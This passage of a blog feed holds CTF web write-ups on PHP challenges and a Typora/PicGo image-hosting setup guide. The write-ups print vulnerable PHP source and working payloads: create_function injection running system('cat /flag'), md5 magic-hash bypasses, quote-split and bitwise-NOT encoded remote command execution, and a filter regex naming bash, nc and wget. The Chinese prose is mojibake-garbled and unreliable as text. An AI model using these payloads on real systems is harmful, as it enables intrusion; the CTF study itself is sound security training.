variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9_]*$/isD'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸ªæ­£åˆ™æ˜¯è®©ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸èƒ½æ˜¯å°å†™å­—æ¯æ•°å­—æˆ–è€…ä¸‹åˆ’çº¿</p><p>çœ‹åˆ°<code>$a(&#39;&#39;,$b);</code>åº”è¯¥æƒ³åˆ°æ˜¯<code>create_function</code>ç»•è¿‡</p><p>æŸ¥çœ‹æ ¹ç›®å½•æ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">a&#x3D;\create_function&amp;b&#x3D;return 1;&#125;system(&#39;ls &#x2F;&#39;);&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœ€ç»ˆpayloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">a&#x3D;\create_function&amp;b&#x3D;return 1;&#125;system(&#39;cat &#x2F;flag&#39;);&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="NSSCTF-2022-Spring-Recruit-babyphp"><a href="#NSSCTF-2022-Spring-Recruit-babyphp" class="headerlink" title="[NSSCTF 2022 Spring Recruit]babyphp"></a>[NSSCTF 2022 Spring Recruit]babyphp</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]/'</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b1'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c1'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"yee"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"nop"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"go on"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"let's get some php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>å…ˆè¿‡ç¬¬ä¸€ä¸ªifï¼Œéœ€è¦aä¸å«æ•°å­—è€Œä¸”intvalå–æ•´æ•°</p></li><li><p>å®˜æ–¹å¯¹intvalçš„è§£é‡Šæ˜¯</p></li></ul><pre class="line-numbers language-none"><code class="language-none">é€šè¿‡ä½¿ç”¨æŒ‡å®šçš„è¿›åˆ¶ base è½¬æ¢ï¼ˆé»˜è®¤æ˜¯åè¿›åˆ¶ï¼‰ï¼Œè¿”å›å˜é‡ value çš„ int æ•°å€¼ã€‚ intval() ä¸èƒ½ç”¨äº objectï¼Œå¦åˆ™ä¼šäº§ç”Ÿ E_WARNING é”™è¯¯å¹¶è¿”å› 1ã€‚ echo intval(array());                 &#x2F;&#x2F; 0echo intval(array(&#39;foo&#39;, &#39;bar&#39;));     &#x2F;&#x2F; 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ‰€ä»¥æˆ‘ä»¬ä¼ å…¥æ•°ç»„å°±èƒ½è¿‡æ‰ç¬¬ä¸€ä¸ªif</p><pre class="line-numbers language-none"><code class="language-none">a[]&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>ç¬¬ä¸‰ä¸ªifï¼Œç”±äºmd5å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„,ä¼šè¿”å›nul</li></ul><pre class="line-numbers language-none"><code class="language-none">b1[]&#x3D;1&amp;b2[]&#x3D;12 md5(b1[]&#x3D;1) &#x3D;&#x3D;&#x3D; md5(b2[]&#x3D;1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>ç¬¬å››ä¸ªifï¼Œéœ€è¦ä¼ å…¥å€¼æ˜¯å­—ç¬¦ä¸²ä¸”md5å€¼ç›¸ç­‰</li></ul><blockquote><p>å¼±åˆ¤æ–­ä¸‹ï¼Œ0eå¼€å¤´çš„æ•°ç­‰äº0ï¼Œæ‰€ä»¥ä½¿ä¸¤ç«¯çš„md5å€¼éƒ½ä¸º0eå¼€å¤´å³å¯</p></blockquote><p>ä»¥ä¸‹è¿™äº›å­—ç¬¦ä¸²ï¼Œmd5å“ˆå¸Œä¹‹åéƒ½æ˜¯0eå¼€å¤´çš„ï¼š</p><pre class="line-numbers language-none"><code class="language-none">QLTHNDT0e405967825401955372549139051580QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">c1&#x3D;QLTHNDT&amp;c2&#x3D;QNKCDZO<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰€ä»¥æœ€ç»ˆçš„payloadæ˜¯</p><pre class="line-numbers language-none"><code class="language-none">a[]&#x3D;1&amp;b1[]&#x3D;2&amp;b2[]&#x3D;12&amp;c1&#x3D;QLTHNDT&amp;c2&#x3D;QNKCDZO<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-finalrce"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-finalrce" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]finalrce"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]finalrce</h1><pre class="line-numbers language-none"><code class="language-none">preg_match(&#39;&#x2F;bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$&#x2F;i&#39;,$url)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ²¡æœ‰è¿‡æ»¤<code>â€˜</code>ã€<code>/</code>ã€<code>tee</code>ã€<code>tac</code>ã€<code>|</code>ã€ç©ºæ ¼</p><p>æˆ‘ä»¬å¯ä»¥ç”¨<code>â€˜</code>ç»•è¿‡æ­£åˆ™ï¼Œä½†æ˜¯execä¸ä¼šå›æ˜¾ï¼Œæ‰€ä»¥å°†æ–‡ä»¶è¾“å‡ºåˆ°æ–‡æœ¬æ–‡æ¡£ä¸­</p><pre class="line-numbers language-none"><code class="language-none">url&#x3D;l&#39;s&#39; &#x2F; | tee 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è®¿é—®1.txtå¾—åˆ°</p><p><img src="https://imag.keyblue.cn/imag/202309221052422.png" alt="image-20230922105206373"></p><p>æ³¨æ„åˆ°<code>la</code>è¢«è¿‡æ»¤äº†ï¼Œç”¨å•å¼•å·ç»•è¿‡ï¼Œpayloadå¦‚ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">url&#x3D;ca&#39;t&#39; &#x2F;flllll&#39;&#39;aaaaaaggggggg| tee 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202309221058434.png" alt="image-20230922105834405"></p><h1 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-hardrce"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-hardrce" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]hardrce"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]hardrce</h1><p>å–åç»•è¿‡</p><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a href="https://www.fengnayun.com/news/content/53902.html">https://www.fengnayun.com/news/content/53902.html</a></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/105656737">https://blog.csdn.net/qq_45521281/article/details/105656737</a></p><p>ç›®çš„æ˜¯<code>eval($wllm)</code>å‘½ä»¤æ‰§è¡Œ</p><p>å…ˆç”¨phpå–å</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//%8C%86%8C%8B%9A%92</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'ls /'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//%93%8C%DF%D0</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ„é€ payload</p><pre class="line-numbers language-none"><code class="language-none">wllm&#x3D;(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202309201908919.png" alt="image-20230920190851884"></p><p>å†æ¬¡å–åæ„é€ payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'cat /flllllaaaaaaggggggg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98</span><span class="token comment">//payload:</span><span class="token comment">//wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">NSSCTF&#123;084648f0-6cf3-4604-8607-cf9b6a10aaeb&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="é¹åŸæ¯-2022-ç®€å•çš„php"><a href="#é¹åŸæ¯-2022-ç®€å•çš„php" class="headerlink" title="[é¹åŸæ¯ 2022]ç®€å•çš„php"></a>[é¹åŸæ¯ 2022]ç®€å•çš„php</h1><p>å½“phpæºç å¦‚ä¸‹æ—¶</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">80</span> <span class="token keyword">or</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[A-Za-z0-9]|\'|"|`|\ |,|\.|-|\+|=|\/|\\|&lt;|>|\$|\?|\^|&amp;|\|/is'</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' Hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\s\(\)]+?\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>ç¬¬ä¸€ä¸ªifé™åˆ¶å­—ç¬¦åœ¨80ä»¥å†…ä¸”ä¸èƒ½ä¼ å­—æ¯æ•°å­—ï¼Œä½†æ²¡æœ‰è¿‡æ»¤<code>[</code>ã€<code>]</code>ã€<code>!</code>ã€<code>%</code>ã€<code>;</code></p><p> preg_replaceçš„è¿‡æ»¤è§„åˆ™å°†é™åˆ¶å‡½æ•°ä¸èƒ½æœ‰å‚æ•°ï¼Œä¹Ÿå°±æ˜¯åªèƒ½é€šè¿‡å‡½æ•°åµŒå¥—å‡½æ•°æ¥è¾¾æˆç›®çš„</p><p>å¯¹äºç¬¬ä¸€ä¸ªifå¯ä»¥é€šè¿‡å–åæ¥ç»•è¿‡ï¼Œç¬¬äºŒä¸ªifå¯ä»¥ä½¿ç”¨äºŒç»´æ•°ç»„çš„æ–¹å¼ç»•è¿‡ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯äºŒç»´æ•°ç»„çš„åˆ†éš”ç¬¦æ˜¯<code>[!%FF]</code>ï¼Œæœ‰ä»¥ä¸‹payload</p></blockquote><p> payloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">[~%8F%97%8F%96%91%99%90][!%FF]();&#x2F;&#x2F;phpinfo();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æˆ‘ä»¬çŸ¥é“ï¼š</p><blockquote><p>getallheaders()å‡½æ•°çš„ä½œç”¨æ—¶è¯»å–è¯·æ±‚å¤´å¹¶è¿”å›æ•°ç»„</p><p>end()çš„ä½œç”¨æ˜¯è¿”å›æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ </p></blockquote><p>é€šè¿‡è¯»å–è¯·æ±‚å¤´å°±å¯ä»¥å®ç°æ— å‚RCE</p><pre class="line-numbers language-none"><code class="language-none">å¯¹å­—ç¬¦ä¸²å–åï¼š%8C%86%8C%8B%9A%92   &#x2F;&#x2F;system%9A%91%9B&#x2F;&#x2F;end%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C&#x2F;&#x2F;getallheaders<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ„é€ payloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">[~%8C%86%8C%8B%9A%92][!%FF]([~%9A%91%9B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));&#x2F;&#x2F;system(end(getallheaders()))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="é¹¤åŸæ¯-2021-EasyP"><a href="#é¹¤åŸæ¯-2021-EasyP" class="headerlink" title="[é¹¤åŸæ¯ 2021]EasyP"></a>[é¹¤åŸæ¯ 2021]EasyP</h1><p>å‚è€ƒï¼š<a href="https://www.nssctf.cn/note/set/1953">https://www.nssctf.cn/note/set/1953</a></p><pre class="line-numbers language-none"><code class="language-none">æ¡ˆä¾‹ç½‘å€ï¼šhttps:&#x2F;&#x2F;www.shawroot.cc&#x2F;php&#x2F;index.php&#x2F;test&#x2F;foo?username&#x3D;root$_SERVER[&#39;PHP_SELF&#39;] å¾—åˆ°ï¼š&#x2F;php&#x2F;index.php&#x2F;test&#x2F;foo$_SERVER[&#39;REQUEST_URI&#39;] å¾—åˆ°ï¼š&#x2F;php&#x2F;index.php&#x2F;test&#x2F;foo?username&#x3D;root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p><code>$_SERVER[&#39;REQUEST_URI&#39;]</code>ä¸ä¼šå°†å‚æ•°ä¸­çš„ç‰¹æ®Šç¬¦å·è¿›è¡Œè½¬æ¢ï¼Œ<br><strong>ä¹Ÿå°±æ˜¯è¯´å®ƒè·å–åˆ°çš„urlä¸Šé¢çš„å€¼ï¼Œä¸ä¼šè¿›è¡Œurlè§£ç </strong></p></blockquote><p>æƒ³è¦å°†show_sourceä¼ é€’ç»™index.phpï¼Œè€Œæˆ‘ä»¬çš„ç›®çš„æ˜¯é«˜äº®æ˜¾ç¤ºutils.phpï¼Œæ‰€ä»¥æœ‰å¦‚ä¸‹payload</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;index.php&#x2F;utils.php&#x2F;?show_source&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™ä¸ªæ­£åˆ™åŒ¹é…å­—ç¬¦ä¸²æœ«å°¾æ˜¯å¦æ˜¯<code>utils.php</code>ï¼Œbasename()å‡½æ•°çš„ä½œç”¨æ˜¯è¿”å›æœ€åä¸€ä¸ª<code>/</code>åé¢çš„å­—ç¬¦ï¼Œå¦‚æœå‡ºç°äº†éasciiå­—ç¬¦å°±ä¼šä¸¢å¼ƒ</p><pre class="line-numbers language-none"><code class="language-none">preg_match(&#39;&#x2F;utils\.php\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰€ä»¥æœ‰ä»¥ä¸‹payloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;index.php&#x2F;utils.php&#x2F;%ff?show_source&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åŒ¹é…å­—ç¬¦ä¸²ä¸­æ˜¯å¦æœ‰<code>show_source</code>ï¼Œphpä¼šæŠŠç©ºæ ¼è®¤ä¸ºæ˜¯<code>_</code>ï¼Œè€Œä¸”<code>$_SERVER[&#39;REQUEST_URI&#39;])</code>ä¸ä¼šè¿›è¡Œurlè§£ç ï¼Œå°†ä»»æ„å­—ç¬¦è¿›è¡Œurlç¼–ç ä¹Ÿå¯ä»¥ç»•è¿‡</p><pre class="line-numbers language-none"><code class="language-none">preg_match(&#39;&#x2F;show_source&#x2F;&#39;, $_SERVER[&#39;REQUEST_URI&#39;])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœ€ç»ˆpayload:</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;index.php&#x2F;utils.php&#x2F;%ff?show%20source&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Web </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è®°ä¸€æ¬¡ä¿¡åˆ›ç³»ç»Ÿä¸‹Typora+PicGo+åä¸ºäº‘OBSï¼Œäº‘å›¾åºŠé…ç½®</title>
      <link href="/2023/05/27/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BF%A1%E5%88%9B%E7%B3%BB%E7%BB%9F%E4%B8%8BTypora+picgo+%E5%8D%8E%E4%B8%BA%E4%BA%91OBS%EF%BC%8C%E4%BA%91%E5%9B%BE%E5%BA%8A%E9%85%8D%E7%BD%AE/"/>
      <url>/2023/05/27/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BF%A1%E5%88%9B%E7%B3%BB%E7%BB%9F%E4%B8%8BTypora+picgo+%E5%8D%8E%E4%B8%BA%E4%BA%91OBS%EF%BC%8C%E4%BA%91%E5%9B%BE%E5%BA%8A%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>Typora + PicGO + åä¸ºäº‘OBS ã€‚Typora Linuxç‰ˆé…ç½®PicGo åä¸ºäº‘OBSå¯¹è±¡å­˜å‚¨ï¼Œä½¿ç”¨Typoraå†™ç¬”è®°å›¾ç‰‡è‡ªåŠ¨ä¸Šä¼ åˆ°åä¸ºäº‘å‚¨å­˜æ¡¶ã€‚</p><h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><p>Linux</p><p>å›½äº§ARMæ¶æ„CPU é£è…¾2000</p><p>é“¶æ²³éº’éºŸV10 SP1ã€‚</p><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>é¦–å…ˆå®‰è£…Typora</p><p>åœ¨Typoraå®˜ç½‘ä¸‹è½½LinuxARMç‰ˆå®‰è£…åŒ…<a href="https://typora.io/#linux">https://typora.io/#linux</a></p><p>è§£å‹ç¼©å®‰è£…åŒ…åˆ°&#x2F;optç›®å½•ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">tar -zxvf Typora-linux-arm64.tar.gz &#x2F;opt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å®‰è£…node.jså’Œnpm</p><pre class="line-numbers language-none"><code class="language-none">sudo apt install nodejssudo apt install npm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å®‰è£…PicGo,ä»“åº“åœ°å€ï¼š<a href="https://github.com/PicGo/PicGo-Core">https://github.com/PicGo/PicGo-Core</a></p><pre class="line-numbers language-none"><code class="language-none">sudo npm install picgo -g<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é…ç½®PicGo-Coreä½¿ç”¨åä¸ºäº‘OBS</p><p>åä¸ºäº‘OBSçš„PicGoæ’ä»¶ä»“åº“åœ°å€ï¼š<a href="https://github.com/YunfengGao/picgo-plugin-huawei-uploader">https://github.com/YunfengGao/picgo-plugin-huawei-uploader</a></p><pre class="line-numbers language-none"><code class="language-none"># è¿›å…¥è¯¥picgoå®‰è£…æ–‡ä»¶å¤¹(è·¯å¾„å¯èƒ½ä¸ä¸€æ ·ï¼Œä»¥è‡ªå·±çš„ä¸ºå‡†)cd &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;picgo&#x2F;bin&#x2F;# å®‰è£…æ’ä»¶.&#x2F;picgo install picgo-plugin-huawei-uploader# é…ç½®æ’ä»¶å‚æ•°.&#x2F;picgo set uploader<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚ä¸‹å›¾é…ç½®ä¿¡æ¯ï¼Œæœ‰4ä¸ªå¿…å¡«é¡¹ï¼Œ</p><ul><li><p>ç¬¬ä¸€ä¸ªå¿…å¡«é¡¹ä¸ºAccessKeyId</p></li><li><p>ç¬¬äºŒä¸ªå¿…å¡«é¡¹ä¸ºSecretAccessKey</p></li><li><p>ç¬¬ä¸‰ä¸ªå¿…å¡«é¡¹ä¸ºæ¡¶åç§°</p></li><li><p>ç¬¬å››ä¸ªå¿…å¡«é¡¹ä¸ºEndpoint</p></li></ul><p><img src="https://imag.keyblue.cn/imag/202309031208306.png" alt="2023-06-08_14-10-42"></p><pre class="line-numbers language-none"><code class="language-none"># é€‰æ‹©huawei-uploaderæ’ä»¶å¹¶åº”ç”¨.&#x2F;picgo use uploader<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æœ€åæ‰“å¼€Typoraåå¥½è®¾ç½®-&gt;å›¾åƒï¼Œå¦‚ä¸‹å›¾é…ç½®å³å¯</p><p><img src="https://imag.keyblue.cn/imag/202309031208291.png" alt="image-20230608141744671"></p><p>é…ç½®å‘½ä»¤å¦‚ä¸‹ï¼Œå…·ä½“è·¯å¾„æ ¹æ®å…·ä½“æƒ…å†µæ›´æ”¹</p><pre class="line-numbers language-none"><code class="language-none">&quot;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;picgo&#x2F;bin&#x2F;picgo&quot; u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœ€åç‚¹å‡»éªŒè¯å›¾ç‰‡ä¸Šä¼ éªŒè¯æ˜¯å¦é…ç½®æˆåŠŸ</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
          <category> å…¶ä»– </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Typora </tag>
            
            <tag> PicGo </tag>
            
            <tag> åä¸ºäº‘OBS </tag>
            
            <tag> ä¿¡åˆ› </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
